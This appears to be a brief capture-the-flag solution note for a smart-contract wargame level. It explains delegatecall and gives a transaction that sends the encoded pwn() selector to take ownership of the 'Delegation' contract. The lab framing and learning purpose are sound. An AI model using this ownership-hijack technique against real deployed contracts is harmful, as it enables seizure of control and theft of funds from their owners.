I feel like delagate calls are asking for trouble.
delegatecall basically makes a call to another contract while
maintaining the same env vars as the caller (I think?)

address(delegate).delegatecall(msg.data)
^^ this sends msg.data to the Delegate contract
if we can call the pwn() function in this delegatecall, we'll
gain ownership of the Delegation contract

I had to use a bit of Google for this one, but you have to encode
the function call you want and put it into the data field:

bytes4(sha3("pwn()")) => 0xdd365b8b

await sendTransaction({
    from: [hacker address],
    to: [instance address], 
    data: "0xdd365b8b"})
